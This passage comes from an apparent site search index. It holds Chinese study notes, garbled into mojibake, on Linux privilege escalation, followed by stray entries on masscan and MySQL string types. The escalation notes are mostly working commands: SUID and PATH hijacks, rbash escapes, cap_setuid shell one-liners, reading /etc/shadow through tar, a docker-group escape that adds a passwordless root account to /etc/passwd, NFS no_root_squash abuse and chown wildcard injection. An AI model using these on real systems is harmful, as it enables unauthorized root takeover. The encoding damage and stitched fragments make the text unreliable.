å¯ä»¥æ‰§è¡Œå‘½ä»¤, è‹¥findæœ‰suidæƒé™, é‚£ä¹ˆä½¿ç”¨execç›¸å½“äºç›´æ¥ææƒåˆ°root: # find / -exec command find /path -exec {} \\; suid-vim vimæœ‰äº†suidå°±å¯ä»¥ä»»æ„æ–‡ä»¶è¯»å–äº† åŒæ—¶ä¹Ÿå¯ä»¥è¾“å…¥: :shell æ¥è·å–root shell bash å¼€å¯ä¸€ä¸ªæ–°shell, suidçš„è¯è‡ªç„¶æ˜¯å¼€å¯root shell: bash -p less/more å’Œvimå·®ä¸å¤š, ä»»æ„æ–‡ä»¶è¯»å–, åŒæ—¶ä¹Ÿå¯ä»¥è¾“å…¥: !command è¿›è¡Œææƒåˆ°root exim eximåœ¨ç‰¹å®šç‰ˆæœ¬ä¸‹ä¼šæœ‰suidææƒ è¿™é‡Œæ²¡æ‡‚ åˆ©ç”¨ç¯å¢ƒå˜é‡ å¦‚æœæˆ‘ä»¬æ‰¾åˆ°ä¸€ä¸ªsuidæƒé™çš„ç¨‹åº, ä½†æ˜¯æˆ‘ä»¬æ— æ³•å®Œæˆsuidææƒ, å°±å¯ä»¥è¯•è¯•æ­é…ç¯å¢ƒå˜é‡è¿›è¡Œææƒ. è¿™ä¸ªææƒæ–¹æ³•çš„æ€æƒ³æ˜¯: æ–‡ä»¶å…·æœ‰ suid æƒé™ æ–‡ä»¶å†…å®¹æœ‰ system å‡½æ•°è°ƒç”¨, ä¸”æ­¤è°ƒç”¨æœªæŒ‡å®šè·¯å¾„ ç”¨æˆ·æœ‰æƒä¿®æ”¹è‡ªå·±ç¯å¢ƒå˜é‡ å°±å¯ä»¥é€šè¿‡åŠ«æŒsystemå‡½æ•°é‡Œè°ƒç”¨çš„è„šæœ¬æ–‡ä»¶, ä½¿å…¶æŒ‡å‘æˆ‘ä»¬ç¯å¢ƒå˜é‡é‡Œè‡ªè¡Œåˆ›å»ºçš„ä¸€ä¸ªåŒåè„šæœ¬æ–‡ä»¶, é‚£ä¹ˆè‡ªè¡Œåˆ›å»ºçš„åŒåè„šæœ¬æ–‡ä»¶å°±èƒ½ä»¥rootæƒé™è¿è¡Œäº†, å¦‚æœè¿™ä¸ªè„šæœ¬æ–‡ä»¶é‡Œçš„å‘½ä»¤æ˜¯/bin/bash, é‚£ä¹ˆå°±ç›¸å½“äºææƒäº†. ä¾‹ å¯¹äºè¢«æ”»å‡»è€…, åˆ›å»ºä¸€ä¸ªå…·æœ‰ä»¥ä¸Šæ¡ä»¶çš„æ–‡ä»¶: â”Œâ”€â”€(rootã‰¿3675b5ebb8ce)-[~] â””â”€# cat demo.c # include <unistd.h> # include <stdlib.h> void main (){ setuid(0); setgid(0); system(\"ps\"); } â”Œâ”€â”€(rootã‰¿3675b5ebb8ce)-[~] â””â”€# gcc demo.c -o do_ps â”Œâ”€â”€(rootã‰¿3675b5ebb8ce)-[~] â””â”€# chmod u+s do_ps â”Œâ”€â”€(rootã‰¿3675b5ebb8ce)-[~] â””â”€# ls -lh do_ps -rwsr-xr-x 1 root root 69K Mar 4 14:44 do_ps â”Œâ”€â”€(rootã‰¿3675b5ebb8ce)-[~] â””â”€# ./do_ps PID TTY TIME CMD 9 pts/1 00:00:00 bash 31 pts/1 00:00:00 do_ps 32 pts/1 00:00:00 sh 33 pts/1 00:00:00 ps â”Œâ”€â”€(rootã‰¿3675b5ebb8ce)-[~] â””â”€# mv do_ps /home/yanque/test/ å¯¹äºæ”»å‡»è€…è€Œè¨€: â”Œâ”€â”€(yanqueã‰¿3675b5ebb8ce)-[~] â””â”€$ find / -perm -u=s -type f 2>/dev/null /home/yanque/test/do_ps â”Œâ”€â”€(yanqueã‰¿3675b5ebb8ce)-[~] â””â”€$ test/do_ps PID TTY TIME CMD 9 pts/1 00:00:00 bash 51 pts/1 00:00:00 su 67 pts/1 00:00:00 do_ps 68 pts/1 00:00:00 sh 69 pts/1 00:00:00 ps å‘ç°è¿”å›äº†pså‘½ä»¤çš„ç»“æœ, å¯æ­¤çŒœæµ‹è¿™ä¸ªæ–‡ä»¶å†…éƒ¨ æœ‰ system(\"ps\"); ç±»ä¼¼è¿™æ ·çš„ä»£ç . æµ‹è¯•... æœ¬åœ°æµ‹è¯•çš„æ—¶å€™ export ä¸€ç›´å¤±è´¥... â”Œâ”€â”€(yanqueã‰¿3675b5ebb8ce)-[~/test] â””â”€$ export $PATH=\"/home/yanque/test:$PATH\" -bash: export: `/usr/local/sbin:/usr/sbin:/sbin:/usr/local/bin:/usr/bin:/bin:/usr/local/games:/usr/games=/home/yanque/test:/usr/local/sbin:/usr/sbin:/sbin:/usr/local/bin:/usr/bin:/bin:/usr/local/games:/usr/games': not a valid identifier é‚æ”¾å¼ƒ ç„¶åè¿›è¡Œä»¥ä¸‹å°è¯•: cd /tmp echo \"/bin/bash\" > ps export $PATH=/tmp:$PATH # éœ€è¦ä¿®æ”¹è‡ªèº«ç¯å¢ƒå˜é‡çš„æƒé™, ä½†åŸºæœ¬ä¸Šéƒ½æœ‰è¿™ä¸ªæƒé™ chmod 777 ./ps # æ²¡è¿™æ¡å‘½ä»¤ä¼šå¯¼è‡´ææƒå¤±è´¥ cd ~ test/do_ps # ææƒæˆåŠŸ rbashç»•è¿‡ rbash, æ˜¯å‡ºäºå®‰å…¨æ€§è€ƒè™‘çš„ä¸€ä¸ªåŠŸèƒ½å—é™çš„bash, ä»–çš„é™åˆ¶æ€§å¯èƒ½ä¼šæœ‰å¦‚ä¸‹. cd åˆ‡æ¢ç›®å½• å«æœ‰æ–œæ  / çš„å‘½ä»¤, è­¬å¦‚ /bin/sh è®¾ç½® PATH ENV ç­‰ç¯å¢ƒå˜é‡ ä½¿ç”¨ > < è¿›è¡Œé‡å®šå‘ binary çš„è¿è¡Œ. é€šå¸¸ root ç”¨æˆ·ä¼šæ‰‹åŠ¨åˆ›å»º /bin/binary_file -> /home/rbash_user/bin/binary_file çš„è½¯é“¾æ¥, é™åˆ¶æ€§åœ°æä¾›éƒ¨åˆ† binary_file ç»™ rbash_user ä½¿ç”¨ åœ¨ bash ä¸‹ echo $SHELL, å¯ä»¥è·å–å½“å‰ç¯å¢ƒæ˜¯å¦æ˜¯ rbash. ä½¿ç”¨scpå‘é€è‡ªå·±çš„bashè¿›è¡Œç»•è¿‡: # å‘é€åˆ°å½“å‰ç”¨æˆ·çš„ç¯å¢ƒå˜é‡è·¯å¾„ä¸‹ scp /usr/bin/bash user@ip:/home/test/bash # æ‰§è¡Œ bash -p åŒæ—¶è¿™é‡Œä¹Ÿå¯ä»¥æƒ³åˆ°, å¾ˆå¤šå‘½ä»¤å¦‚man,git config help,more,less,vim,vi,ftp,gdbç­‰, éƒ½æœ‰è‡ªå·±çš„shell, åªéœ€åœ¨ä»–ä»¬å„è‡ªçš„shellä¸­æ‰§è¡Œ/bin/shå³å¯è¿›å…¥bashç•Œé¢, ä¸€èˆ¬éƒ½æ˜¯åœ¨shellé”®å…¥: !/bin/sh æ¥ bypass rbash vim å¦‚å¯¹äºvim, å¯æ‰§è¡Œä»¥ä¸‹å‘½ä»¤ç»•è¿‡: :set shell=/bin/bash :shell find å¯¹äºfindæ¥è¯´: find -exec /bin/bash \\; cp å¯¹äºcp: # æŸ¥çœ‹å½“å‰ç”¨æˆ·ç¯å¢ƒå˜é‡ export -p # ç„¶åä½¿ç”¨cp å°† /usr/bin ä¸‹æ–‡ä»¶å¤åˆ¶è¿‡æ¥å³å¯ ç¼–ç¨‹è¯­è¨€ç»•è¿‡ python: python -c \"import os;os.system('/bin/bash')\" php: # php -a è¿›å…¥php shell exec(\"/bin/bash\"); perl: perl -e 'exec \"/bin/sh\";' ruby: ruby -e 'exec \"/bin/bash\"' ssh å¯¹äºssh, é€šè¿‡sshé“¾æ¥å½“å‰IPçš„å½“å‰ç”¨æˆ·å¹¶å¯åŠ¨/bin/bash: ssh username@Ip -t \"/bin/bash\" å†…æ ¸ææƒ å…ˆæŸ¥çœ‹ç³»ç»Ÿå†…æ ¸ç‰ˆæœ¬: uname -a ç„¶åæ‰¾expæ‰“ passwdå’Œshadow æ˜æ–‡å¯†ç  /etc/passwd é»˜è®¤æ‰€æœ‰ç”¨æˆ·å¯è¯», ä½†åªæœ‰rootå¯å†™. /etc/passwdé‡Œçš„ç”¨æˆ·å£ä»¤å¾€å¾€ä»¥xä»£æ›¿, å…¶åŠ å¯†åçš„å¯†ç ä¼šå­˜å…¥/etc/shadowé‡Œé¢, /etc/shadowé»˜è®¤åªæœ‰rootå¯è¯». ä½†æ˜¯æœ‰å°æ¦‚ç‡æƒ…å†µ, æ˜æ–‡å¯†ç å°±ç›´æ¥å‡ºç°åœ¨/etc/passwdäº†, å¦‚æœæœ‰è¿™ä¸ªæƒ…å†µä¸”rootå¯†ç æš´éœ²åœ¨äº†passwdé‡Œ, é‚£ä¹ˆå°±å¯ä»¥è½»è€Œæ˜“ä¸¾ææƒäº† passwd å¯å†™ å¦‚æœ/etc/passwd æˆ‘ä»¬å½“å‰ç”¨æˆ·å¯å†™, å¯ä»¥ç›´æ¥æŠŠrootçš„å¯†ç æ”¹æˆä¸€ä¸ªæ˜æ–‡å¯†ç , ä»è€Œè¾¾åˆ°ææƒç›®çš„ çˆ†ç ´shadow å¦‚æœ/etc/shadow å¯è¯», æˆ‘ä»¬å¯ä»¥ç”¨hashcatæˆ–è€…johnæš´åŠ›ç ´è§£shadowæ–‡ä»¶ è®¡åˆ’ä»»åŠ¡(crontab) æ–‡ä»¶é‡å†™ è®¡åˆ’ä»»åŠ¡ç”±crontabç®¡ç†, érootç”¨æˆ·æ˜¯æ— æ³•åˆ—å‡ºrootç”¨æˆ·çš„è®¡åˆ’ä»»åŠ¡çš„, ä½†æˆ‘ä»¬å¯ä»¥åˆ—å‡º/etcçš„ç³»ç»Ÿä»»åŠ¡, ç³»ç»Ÿä»»åŠ¡é»˜è®¤æ˜¯rootæƒé™è¿è¡Œçš„: ls -l /etc/cron* å¦‚æœæˆ‘ä»¬æœ‰å¹¸æœ‰æƒé™èƒ½æ›´æ”¹å…¶ä¸­ä¸€ä¸ªä»»åŠ¡æŒ‡å®šçš„è„šæœ¬, æˆ‘ä»¬å°±å¯ä»¥å¾€è„šæœ¬é‡Œæ·»åŠ å¦‚åå¼¹shellç­‰æŒ‡ä»¤, ä»è€Œææƒ ç¯å¢ƒå˜é‡åŠ«æŒ æŸ¥çœ‹å®šæ—¶ä»»åŠ¡ å‘ç°å®šä¹‰äº†è¯¸å¤šç¯å¢ƒå˜é‡, å¦‚æœå…¶ä»»åŠ¡æœ‰æœªæŒ‡å®šç»å¯¹è·¯å¾„çš„æŒ‡ä»¤, å¦‚: 17 * * * * root shell.sh è€Œä¸”æˆ‘ä»¬åœ¨å…¶ç¯å¢ƒå˜é‡è·¯å¾„ä¸­å¯ä»¥è¿›è¡Œå†™å…¥æ“ä½œ, é‚£ä¹ˆæˆ‘ä»¬å¯ä»¥é€šè¿‡å†™å…¥ç¯å¢ƒå˜é‡çš„é å‰è·¯å¾„ä¸€ä¸ªåŒåæ¶æ„æ–‡ä»¶ä»è€Œå¯¼è‡´ç¯å¢ƒå˜é‡åŠ«æŒ æ¯”å¦‚æˆ‘ä»¬åœ¨/sbin å†™å…¥ä¸€ä¸ª åå¼¹shellåŠŸèƒ½çš„shell.sh, é‚£ä¹ˆå°±å¯ä»¥é€ æˆææƒ å¯†ç æŸ¥æ‰¾ è¿™ä¸ªææƒæŠ€æœ¯è¯´ç™½äº†, å°±æ˜¯å»åˆ°å¤„ç¿»å¯†ç  å¯ä»¥é€šè¿‡ä»¥ä¸‹å‘½ä»¤, æŒ‡å®šå…³é”®å­—, åœ¨æ‰€æœ‰æ–‡ä»¶ä¸­æœç´¢å†…å®¹ä¸­æœ‰å…³é”®å­—çš„æ–‡ä»¶: grep --color=auto -rnw '/' -ie \"PASSWORD\" --color=always 2> /dev/null find . -type f -exec grep -i -I \"PASSWORD\" {} /dev/null \\; æŸ¥æ‰¾ååˆ†é’Ÿå†…æ›´æ”¹è¿‡çš„æ–‡ä»¶: find / -mmin -10 2>/dev/null | grep -Ev \"&#94;/proc\" (ä¸æ˜¾ç¤º&#94;/procæ–‡ä»¶æˆ–æ–‡ä»¶å¤¹) capabilities capabilities æ˜¯linux2.2åå‡ºç°çš„äº§ç‰©, å®ƒçš„å‡ºç°ä¸€å®šç¨‹åº¦ä¸Šå¼¥è¡¥äº†suidè¿™ç§ç²—ç³™çš„æƒé™ç®¡ç†æœºåˆ¶, ä½†æ˜¯capabilities è‡ªèº«ä¹Ÿæœ‰é€ æˆææƒçš„å®‰å…¨éšæ‚£ ç®€ä»‹ capabilities æŠŠrootçš„æƒé™ç»†åˆ†äº†, å¯ä»¥åˆ†åˆ«å¯ç”¨æˆ–è€…ç¦ç”¨. euid è§ /docs/æ“ä½œç³»ç»Ÿ/linux/æ¦‚å¿µæ€§/linuxä¸‹æ–‡ä»¶æƒé™ä½ ä¸‹ æ–‡ä»¶æƒé™çš„sä½å’Œtä½çš„ç†è§£ å°èŠ‚ åœ¨è¿›è¡Œç‰¹æƒæ“ä½œçš„æ—¶å€™, å¦‚æœ euid ä¸æ˜¯root, é‚£ä¹ˆç³»ç»Ÿå°±ä¼šæ£€æŸ¥æ˜¯å¦å…·æœ‰æ‰§è¡Œç‰¹æƒæ“ä½œçš„å¯¹åº”capabilities , å¹¶ä»¥æ­¤ä¸ºå‡­æ®å†³å®šç‰¹æƒæ“ä½œæ˜¯å¦èƒ½è¢«æ‰§è¡Œ. å¦‚ä¸‹æ˜¯ä¸€äº›å¸¸è§çš„ç‰¹æƒæ“ä½œåŠå…¶å¯¹åº”capabilities æ”¹å˜æ–‡ä»¶çš„æ‰€å±è€…(chown()) CAP_CHOWN å‘è¿›ç¨‹å‘é€ä¿¡å·(kill() signal()) CAP_KILL æ”¹å˜è¿›ç¨‹çš„uid(setuid() setreuid() setresuid()ç­‰) CAP_SETUID traceè¿›ç¨‹(ptrace()) CAP_SYS_PTRACE è®¾ç½®ç³»ç»Ÿæ—¶é—´(settimeofday() stime()ç­‰) CAP_SYS_TIME å¿½ç•¥æ–‡ä»¶è¯»åŠç›®å½•æœç´¢çš„DACè®¿é—®é™åˆ¶ CAP_DAC_READ_SEARCH å…³äºcapabilitiesçš„ç®¡ç†å·¥å…·æœ‰å¦‚ä¸‹: getcap setcap capsh filecap getcap getcap ç”¨äºæŸ¥è¯¢capabilities, setcapç”¨äºè®¾ç½®capabilities, capshç”¨äºæŸ¥å½“å‰shellè¿›ç¨‹çš„capabilities, filecapæ—¢èƒ½è®¾ç½®åˆèƒ½æŸ¥è¯¢. æˆ‘ä»¬å¯ä»¥é€šè¿‡ä»¥ä¸‹æŒ‡ä»¤æœç´¢è®¾ç½®äº†capabilitiesçš„å¯æ‰§è¡Œæ–‡ä»¶: getcap -r / 2>/dev/null å®æ“ - é€šè¿‡ cap_setuid cap_setuid å¯ä»¥è®¾ç½®å½“å‰ç”¨æˆ·çš„euid, æˆ‘ä»¬å¯ä»¥é€šè¿‡æ­¤é€‰é¡¹æ¥è¿›è¡Œä¸€äº›ææƒ. ä»¥pythonä¸ºä¾‹: ./python3.8 = cap_setuid+eip ç°python3.8 æœ‰cap_setuidæƒé™, é‚£ä¹ˆæˆ‘ä»¬å¯ä»¥ç”¨ä»¥ä¸‹æŒ‡ä»¤è¿›è¡Œææƒ: python -c 'import os; os.setuid(0); os.system(\"/bin/sh\")' ç±»ä¼¼çš„æœ‰å¾ˆå¤š perl: perl -e 'use POSIX qw(setuid); POSIX::setuid(0); exec \"/bin/sh\";' gdb: gdb -nx -ex 'python import os; os.setuid(0)' -ex '!sh' -ex quit php: php -r \"posix_setuid(0); system('/bin/sh');\" python: python -c 'import os; os.setuid(0); os.system(\"/bin/sh\")' rvim (éœ€è¦æ”¯æŒpython3æ¨¡å—) rvim -c ':py import os; os.setuid(0); os.execl(\"/bin/sh\", \"sh\", \"-c\", \"reset; exec sh\")' vim (éœ€è¦æ”¯æŒpython3æ¨¡å—, vim --version æŸ¥è¯¢, æ˜¯å¦æ”¯æŒpy3) vim -c ':py import os; os.setuid(0); os.execl(\"/bin/sh\", \"sh\", \"-c\", \"reset; exec sh\")' å®æ“ - é€šè¿‡ CAP_DAC_READ_SEARCH cap_dac_read_search å¯ä»¥ç»•è¿‡æ–‡ä»¶çš„è¯»æƒé™æ£€æŸ¥ä»¥åŠç›®å½•çš„è¯»/æ‰§è¡Œæƒé™çš„æ£€æŸ¥. åˆ©ç”¨æ­¤ç‰¹æ€§æˆ‘ä»¬å¯ä»¥è¯»å–ç³»ç»Ÿä¸­çš„æ•æ„Ÿä¿¡æ¯. å¦‚æœtaræœ‰æ­¤æƒé™, æˆ‘ä»¬å¯ä»¥é€šè¿‡æ­¤æ¥æŸ¥çœ‹æ•æ„Ÿæ–‡ä»¶å†…å®¹: tar cvf shadow.tar /etc/shadow //åˆ›å»ºå‹ç¼©æ–‡ä»¶ tar -xvf shadow.tar //è§£å‹ç¼© cd etc //è¿›å…¥è§£å‹ç¼©çš„ç›®å½• chmod +r shadow //èµ‹äºˆè¯»æƒé™ cat shadow | grep root //æŸ¥çœ‹shadowæ–‡ä»¶çš„å†…å®¹ Docker Dockerç”¨æˆ·ç»„ææƒ å¦‚æœæˆ‘ä»¬æ‹¿åˆ°äº†ä¸€ä¸ªDockerç”¨æˆ·ç»„çš„ç”¨æˆ·æƒé™, é‚£ä¹ˆæˆ‘ä»¬å¯ä»¥å¾ˆè½»æ¾åœ°å®Œæˆææƒ é¦–å…ˆæˆ‘ä»¬æ‰§è¡Œå¦‚ä¸‹å‘½ä»¤: docker run -v /:/mnt --rm -it crf_web1 chroot /mnt sh ç„¶ååœ¨å…¶ä¸­çš„/etc/passwdä¸­å†™å…¥ä¸€ä¸ªrootæƒé™ç”¨æˆ·ï¼ˆè¿™é‡Œç›´æ¥æ— å¯†ç äº†ï¼‰ root2::0:0::/root:/bin/bash ç„¶åé€€å‡ºæ¥, ç›´æ¥å°è¯•: su root2 NFS NFS æ˜¯ä¸€ä¸ªç”¨æ¥å…±äº«ç›®å½•çš„ä¸œè¥¿, ä½†è‹¥é…ç½®æƒé™ä¸å½“åˆ™ä¼šå¼•å‘å®‰å…¨é—®é¢˜ no_root_squash æˆ‘ä»¬ cat /etc/exports å¦‚æœæœ‰ no_root_squash å­—æ ·, åˆ™è¯´æ˜rootç”¨æˆ·ä¼šå¯¹å…±äº«ç›®å½•æ‹¥æœ‰è‡³é«˜çš„æƒé™æ§åˆ¶, å°±åƒæ˜¯å¯¹æœ¬æœºçš„ç›®å½•æ“ä½œä¸€æ ·. ä¹Ÿå°±æ˜¯è¯´, ä»»ä½•æœºå™¨çš„rootåœ¨æ­¤ç›®å½•ä¸Šéƒ½æœ‰æœ€é«˜æƒé™. æˆ‘ä»¬åœ¨è·å¾—ä¸€å°æœºå™¨çš„rootæƒé™å, å¯ä»¥é€šè¿‡nfsåœ¨å¦ä¸€å°ä½æƒé™æœºå™¨ä¸Šå®ç°ææƒ: mkdir /tmp/nfs mount -o rw,vers=3 10.10.10.10:/tmp /tmp/nfs # å°†æœ¬æœºä¸Šçš„/tmp/nfs æŒ‚è½½åˆ°å…±äº«ç›®å½• cp /bin/bash /tmp/nfs/bash chmod u+s /tmp/nfs/bash è®¾ç½®å…±äº«ç›®å½•ä¸Šbashçš„suid å›åˆ°ä½æƒé™æœº, æ‰§è¡Œ /tmp/bash å®Œæˆææƒ é€šé…ç¬¦ææƒ åˆ©ç”¨é€šé…ç¬¦å®ç°Linuxæœ¬åœ°ææƒ ä¸€ç§å¤è€çš„UNIXé»‘å®¢æŠ€æœ¯â€”é€šé…ç¬¦æ³¨å…¥ é€šé…ç¬¦æ˜¯ä¸€ä¸ªå­—ç¬¦æˆ–ä¸€ç»„å­—ç¬¦, å¯ä»¥ç”¨æ¥æ›¿æ¢æŸäº›èŒƒå›´/ç±»åˆ«çš„å­—ç¬¦. åœ¨æ‰§è¡Œä»»ä½•å…¶ä»–æ“ä½œä¹‹å‰, é€šé…ç¬¦é¦–å…ˆè¦ç»è¿‡shellè¿›è¡Œè§£é‡Š. ä¸€äº›å¸¸è§çš„é€šé…ç¬¦: * æ˜Ÿå·å¯ä»¥ä¸æ–‡ä»¶åä¸­çš„ä»»æ„æ•°é‡çš„å­—ç¬¦åŒ¹é…, åŒ…æ‹¬0ä¸ªå­—ç¬¦. ? é—®å·ç”¨äºåŒ¹é…ä»»æ„å•ä¸ªå­—ç¬¦. [] æ‹¬å·å†…åŒ…æ‹¬ä¸€ç»„å­—ç¬¦, å…¶ä¸­ä»»ä½•ä¸€ä¸ªå­—ç¬¦éƒ½å¯ä»¥åŒ¹é…è¯¥ä½ç½®ä¸Šçš„å•ä¸ªå­—ç¬¦. â€“ []ä¸­çš„è¿å­—ç¬¦è¡¨ç¤ºå­—ç¬¦èŒƒå›´. ~ å•è¯å¼€å¤´çš„æ³¢æµªç¬¦è¡¨ç¤ºå½“å‰ç”¨æˆ·çš„ä¸»ç›®å½•çš„åç§°. å¦‚æœè¯¥å­—ç¬¦åé¢æ˜¯å¦ä¸€ä¸ªç”¨æˆ·çš„ç™»å½•å, åˆ™è¡¨ç¤ºè¯¥ç”¨æˆ·çš„ä¸»ç›®å½•. ä¾‹1-é€šè¿‡ChownåŠ«æŒæ–‡ä»¶æ‰€æœ‰è€… å‰ç½®, rootæƒ³ç»™å¤šç”¨æˆ·æä¾›ä¸€ä¸ªå…¬å…±çš„ç›®å½•: â”Œâ”€â”€(rootã‰¿3675b5ebb8ce)-[~] â””â”€# mkdir /tmp/common â”Œâ”€â”€(rootã‰¿3675b5ebb8ce)-[~] â””â”€# chmod 777 /tmp/common ç”¨æˆ· yanque åœ¨å…¶ä¸‹åˆ›å»ºäº†ä¸‰ä¸ªæ–‡ä»¶: â”Œâ”€â”€(yanqueã‰¿3675b5ebb8ce)-[/tmp/common] â””â”€$ touch file1.php file2.php file3.php â”Œâ”€â”€(yanqueã‰¿3675b5ebb8ce)-[/tmp/common] â””â”€$ ls -lh total 0 -rw-r--r-- 1 yanque yanque 0 Mar 5 15:59 file1.php -rw-r--r-- 1 yanque yanque 0 Mar 5 15:59 file2.php -rw-r--r-- 1 yanque yanque 0 Mar 5 15:59 file3.php æ”»å‡»è€… yq å‘ç°äº†è¿™ä¸ªç›®å½•ä¸‹çš„æ–‡ä»¶éƒ½æ˜¯ yanque çš„, çŒœæµ‹rootç”¨æˆ·å¯èƒ½ä¼šå¯¹å…¶ä½¿ç”¨é€šé…ç¬¦çš„æ–¹å¼è¿›è¡Œæˆæƒæ“ä½œ, äºæ˜¯åšå‡ºä»¥ä¸‹æ“ä½œ: â”Œâ”€â”€(yqã‰¿3675b5ebb8ce)-[/tmp/common] â””â”€$ echo >--reference=my.php â”Œâ”€â”€(yqã‰¿3675b5ebb8ce)-[/tmp/common] â””â”€$ echo >my.php â”Œâ”€â”€(yqã‰¿3675b5ebb8ce)-[/tmp/common] â””â”€$ ls -lh total 8.0K -rw-r--r-- 1 yq yq 1 Mar 5 16:04 '--reference=my.php' -rw-r--r-- 1 yanque yanque 0 Mar 5 15:59 file1.php -rw-r--r-- 1 yanque yanque 0 Mar 5 15:59 file2.php -rw-r--r-- 1 yanque yanque 0 Mar 5 15:59 file3.php -rw-r--r-- 1 yq yq 1 Mar 5 16:04 my.php æŠ€å·§ çŒœæµ‹rootå¯èƒ½ä¼šæ‰§è¡Œ: cd /tmp/common && chown -R yanque:yanque *.php ä¼å›¾è®©å®é™…æ‰§è¡ŒæŒ‡ä»¤å˜ä¸º: chown yanque:yanque /tmp/common/* --reference=my.php rootå› ä¸ºæŸäº›ä¸çŸ¥åçš„åŸå› è¿›è¡Œäº†æˆæƒæ“ä½œ: â”Œâ”€â”€(rootã‰¿3675b5ebb8ce)-[/] â””â”€# cd /tmp/common/ â”Œâ”€â”€(rootã‰¿3675b5ebb8ce)-[/tmp/common] â””â”€# chown -R yanque:yanque *.php chown: cannot access 'yanque:yanque': No such file or directory â”Œâ”€â”€(rootã‰¿3675b5ebb8ce)-[/tmp/common] â””â”€# ls -lh total 8.0K -rw-r--r-- 1 yq yq 1 Mar 5 16:04 '--reference=my.php' -rw-r--r-- 1 yq yq 0 Mar 5 15:59 file1.php -rw-r--r-- 1 yq yq 0 Mar 5 15:59 file2.php -rw-r--r-- 1 yq yq 0 Mar 5 15:59 file3.php -rw-r--r-- 1 yq yq 1 Mar 5 16:04 my.php æƒé™å˜æˆäº†yqçš„. ä¾‹2-é€šè¿‡taræŠ•é€æ¼æ´åˆ©ç”¨ä»£ç ","tags":"å®‰å…¨","url":"/yq-doc-source-docs-Safety-Summary.html","loc":"/yq-doc-source-docs-Safety-Summary.html"},{"title":"masscan","text":"ä¸ /docs/å®‰å…¨/kali/kaliæ¸—é€ä¸“ç”¨æŒ‡ä»¤/nmap ç±»ä¼¼, ä¿¡æ¯è·å–çš„å‡†ç¡®åº¦ä½ä¸€ç‚¹, é€Ÿåº¦ä¼šå¿«ä¸€ç‚¹.","tags":"å®‰å…¨","url":"/yq-doc-source-docs-Safety-kali-Kali-penetration-special-instruction-Masscan.html","loc":"/yq-doc-source-docs-Safety-kali-Kali-penetration-special-instruction-Masscan.html"},{"title":"æ•°æ®ç±»å‹VARCHARå’ŒCHAR","text":"å›ºå®šé•¿åº¦ & å¯å˜é•¿åº¦ VARCHAR VARCHARç±»å‹ç”¨äºå­˜å‚¨ å¯å˜é•¿åº¦ å­—ç¬¦ä¸²ï¼Œæ˜¯æœ€å¸¸è§çš„å­—ç¬¦ä¸²æ•°æ®ç±»å‹ã€‚ å®ƒæ¯”å›ºå®šé•¿åº¦ç±»å‹æ›´èŠ‚çœç©ºé—´ï¼Œå› ä¸ºå®ƒä»…ä½¿ç”¨å¿…è¦çš„ç©ºé—´(æ ¹æ®å®é™…å­—ç¬¦ä¸²çš„é•¿åº¦æ”¹å˜å­˜å‚¨ç©ºé—´)ã€‚ æœ‰ä¸€ç§æƒ…å†µä¾‹å¤–ï¼Œå¦‚æœMySQLè¡¨ä½¿ç”¨ROW_FORMAT=FIXEDåˆ›å»ºçš„è¯ï¼Œæ¯ä¸€è¡Œéƒ½ä¼šä½¿ç”¨å®šé•¿å­˜å‚¨ã€‚ CHAR CHARç±»å‹ç”¨äºå­˜å‚¨å›ºå®šé•¿åº¦å­—ç¬¦ä¸²: MySQLæ€»æ˜¯æ ¹æ®å®šä¹‰çš„å­—ç¬¦ä¸²é•¿åº¦åˆ†é…è¶³å¤Ÿçš„ç©ºé—´ã€‚ å½“å­˜å‚¨CHARå€¼æ—¶ï¼ŒMySQLä¼šåˆ é™¤å­—ç¬¦ä¸²ä¸­çš„æœ«å°¾ç©ºæ ¼ (åœ¨MySQL 4.1å’Œæ›´è€ç‰ˆæœ¬ä¸­VARCHAR ä¹Ÿæ˜¯è¿™æ ·å®ç°çš„ â€”â€” ä¹Ÿå°±æ˜¯è¯´è¿™äº›ç‰ˆæœ¬ä¸­CHARå’ŒVARCHARåœ¨é€»è¾‘ä¸Šæ˜¯ä¸€æ ·çš„ï¼ŒåŒºåˆ«åªæ˜¯åœ¨å­˜å‚¨æ ¼å¼ä¸Š)ã€‚ åŒæ—¶ï¼ŒCHARå€¼ä¼šæ ¹æ®éœ€è¦é‡‡ç”¨ç©ºæ ¼è¿›è¡Œå‰©ä½™ç©ºé—´å¡«å……ï¼Œä»¥æ–¹ä¾¿æ¯”è¾ƒå’Œæ£€ç´¢ã€‚ ä½†æ­£å› ä¸ºå…¶é•¿åº¦å›ºå®šï¼Œæ‰€ä»¥ä¼šå æ®å¤šä½™çš„ç©ºé—´ï¼Œä¹Ÿæ˜¯ä¸€ç§ç©ºé—´æ¢æ—¶é—´çš„ç­–ç•¥ï¼› å­˜å‚¨æ–¹å¼ VARCHAR VARCHARéœ€è¦ä½¿ç”¨1æˆ–2ä¸ªé¢å¤–å­—èŠ‚è®°å½•å­—ç¬¦ä¸²çš„é•¿åº¦: å¦‚æœåˆ—çš„æœ€å¤§é•¿åº¦å°äºæˆ–ç­‰äº255å­—èŠ‚ï¼Œåˆ™åªä½¿ç”¨1ä¸ªå­—èŠ‚è¡¨ç¤ºï¼Œå¦åˆ™ä½¿ç”¨2ä¸ªå­—èŠ‚ã€‚ å‡è®¾é‡‡ç”¨latinlå­—ç¬¦é›†ï¼Œä¸€ä¸ªVARCHAR(10)çš„åˆ—éœ€è¦11ä¸ªå­—èŠ‚çš„å­˜å‚¨ç©ºé—´ã€‚ VARCHAR(1000)çš„åˆ—åˆ™éœ€è¦1002 ä¸ªå­—èŠ‚ï¼Œå› ä¸ºéœ€è¦2ä¸ªå­—èŠ‚å­˜å‚¨é•¿åº¦ä¿¡æ¯ã€‚ VARCHARèŠ‚çœäº†å­˜å‚¨ç©ºé—´ï¼Œæ‰€ä»¥å¯¹æ€§èƒ½ä¹Ÿæœ‰å¸®åŠ©ã€‚ ä½†æ˜¯ï¼Œç”±äºè¡Œæ˜¯å˜é•¿çš„ï¼Œåœ¨UPDATEæ—¶å¯èƒ½ä½¿è¡Œå˜å¾—æ¯”åŸæ¥æ›´é•¿ï¼Œè¿™å°±å¯¼è‡´éœ€è¦åšé¢å¤–çš„å·¥ä½œã€‚ å¦‚æœä¸€ä¸ªè¡Œå ç”¨çš„ç©ºé—´å¢é•¿ï¼Œå¹¶ä¸”åœ¨é¡µå†…æ²¡æœ‰æ›´å¤šçš„ç©ºé—´å¯ä»¥å­˜å‚¨ï¼Œ åœ¨è¿™ç§æƒ…å†µä¸‹ï¼Œä¸åŒçš„å­˜å‚¨å¼•æ“çš„å¤„ç†æ–¹å¼æ˜¯ä¸ä¸€æ ·çš„ã€‚ 